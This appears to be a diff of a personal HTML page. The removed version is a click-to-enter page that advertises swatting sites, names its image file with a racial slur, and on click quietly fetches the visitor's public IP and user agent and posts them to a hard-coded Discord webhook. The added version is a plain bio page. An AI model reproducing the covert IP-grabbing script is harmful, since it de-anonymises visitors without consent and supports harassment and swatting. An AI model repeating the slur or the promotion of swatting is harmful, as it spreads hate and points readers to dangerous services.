@@ -3,126 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HI</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            background: black;
-            font-family: Arial, sans-serif;
-            overflow: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: white;
-            position: relative;
-        }
-        .overlay {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            cursor: pointer;
-            z-index: 2;
-        }
-        .container {
-            text-align: center;
-            color: white;
-            display: none;
-            z-index: 1;
-        }
-        .contact {
-            position: absolute;
-            bottom: 10px;
-            left: 50%;
-            transform: translateX(-50%);
-            font-size: 16px;
-            text-align: center;
-            color: white;
-            z-index: 1;
-        }
-    </style>
+    <title>those who know</title>
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <div class="overlay">
-        <img src="niggers.jpg" alt="Click to Enter" width="300">
+    <div class="bio-container">
+        <div class="profile-picture">
+            <img src="pfp24.jpg" alt="Profile Picture">
+        </div>
+        <div class="name">
+            <h1>tailzzz</h1>
+        </div>
+        <div class="greeting">
+            <p>hi :3</p>
+        </div>
     </div>
-    <div class="container">
-        <h1>Other Sites:</h1>
-        <p>swatcity.fun swats.shop</p>
-    </div>
-
-    <div class="contact">
-        <p>Contact: lol@interpol.int.pl</p>
-    </div>
-
-    <audio id="background-music" src="friends.mp3" preload="auto" loop></audio>
-
-    <script>
-        const overlay = document.querySelector('.overlay');
-        const container = document.querySelector('.container');
-        const audio = document.getElementById('background-music');
-
-        // Function to send client data (IP and User Agent only)
-        function sendClientData() {
-            const userAgent = navigator.userAgent;
-
-            // Fetch the client's public IP address
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ip = data.ip;
-
-                    // Send IP and User Agent to Discord Webhook
-                    const discordWebhookUrl = 'https://discord.com/api/webhooks/1297320592873226310/b6T85znqRz0nVCUQJyU3JQbfNRrRTYIbWYCwj_1iVCVnFvm-OQBbSov_i3tinFySkgF2'; // Replace with your webhook URL
-                    const logData = {
-                        content: `Client Data:
-                        IP: ${ip}
-                        User Agent: ${userAgent}
-                        `
-                    };
-
-                    fetch(discordWebhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(logData)
-                    })
-                    .then(response => {
-                        console.log('Client data sent to Discord.');
-                    })
-                    .catch(err => {
-                        console.error('Error sending to Discord:', err);
-                    });
-                })
-                .catch(err => {
-                    console.error('Error fetching IP:', err);
-                });
-        }
-
-        // Function to make the browser go fullscreen
-        function goFullScreen() {
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen();
-            } else if (document.documentElement.mozRequestFullScreen) { 
-                document.documentElement.mozRequestFullScreen();
-            } else if (document.documentElement.webkitRequestFullscreen) { 
-                document.documentElement.webkitRequestFullscreen();
-            } else if (document.documentElement.msRequestFullscreen) { 
-                document.documentElement.msRequestFullscreen();
-            }
-        }
-
-        // Event listener for overlay click
-        overlay.addEventListener('click', () => {
-            overlay.style.display = 'none';
-            container.style.display = 'block'; // Show the text when the overlay is clicked
-            audio.play();
-            goFullScreen(); 
-            sendClientData(); // Send IP and User Agent data only
-        });
-    </script>
 </body>
 </html>
